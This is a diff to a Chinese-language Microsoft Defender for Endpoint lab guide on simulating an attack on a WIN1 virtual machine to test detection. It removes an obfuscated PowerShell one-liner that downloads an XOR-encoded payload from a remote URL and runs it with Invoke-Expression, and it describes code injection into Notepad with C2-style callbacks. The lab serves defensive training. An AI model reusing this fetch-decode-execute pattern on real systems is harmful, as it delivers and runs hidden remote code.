@@ -78,23 +78,13 @@ lab:
 
 >**警告：** 此模拟攻击非常适合实践式学习。 在使用 Azure 租户提供的课程时，请仅执行为本实验室提供的说明中的攻击。  在此租户完成此培训课程后，可以执行其他模拟攻击。**
 
-在此任务中，你将模拟 WIN1 虚拟机上的攻击，并验证 Microsoft Defender for Endpoint 是否检测到并缓解了攻击。
+在此任务中，你将模拟 WIN1 虚拟机上的攻击（通过运行 PowerShell 脚本），并验证 Microsoft Defender for Endpoint 是否检测到并缓解了攻击。
 
-1. 在 WIN1 虚拟机上，右键单击“开始”按钮，然后选择“Windows PowerShell (管理员)”**********。
+1. 在 WIN1 虚拟机上，在搜索栏中键入“**PowerShell**”，然后*右键单击*“**Windows PowerShell**”，并选择“*以管理员身份运行*”。
 
 1. 显示“用户帐户控制”窗口时，选择“**是**”以允许应用运行。
 
-1. 复制以下模拟脚本并将其粘贴到 PowerShell 窗口中，然后按 Enter 来运行该脚本****：
-
-    ```PowerShell
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    ;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');
-    $base64String = (Invoke-WebRequest -URI "https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt" -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
-    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
-    $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
-    ```
-
-    >**注意：** 如果在运行脚本时遇到错误（红色），则可以打开记事本应用并将脚本复制到空白文件中。 确保在记事本中启用了“自动换行”**。 然后在 PowerShell 中单独复制并运行脚本的每一行。 此外，实验开始时下载的文件中提供了一个 PowerShell 脚本 (attacksim.ps1)。 若要使用该脚本，请在“Windows PowerShell (管理员)”中导航到 \Users\Admin\Desktop\Allfiles 文件夹并键入 .\attacksim.ps1，然后按 Enter 运行。************
+1. 要运行该脚本，请在“**Windows PowerShell (管理员)**”中导航到 *\Users\Admin\Desktop\Allfiles* 文件夹并键入“*.\AttackScript.ps1*”，然后按 **Enter** 运行。 接下来，键入“**R**”，然后按 **Enter** 来“*运行一次*”。
 
 1. 该脚本将生成多行输出，并生成一条消息，指出“无法解析域中的域控制器”**。 几秒钟后，“记事本”应用将打开**。 模拟攻击代码将注入记事本中。 保持自动生成的记事本实例处于打开状态，以体验完整场景。 模拟攻击代码将尝试与外部 IP 地址通信（模拟 C2 服务器）。
 
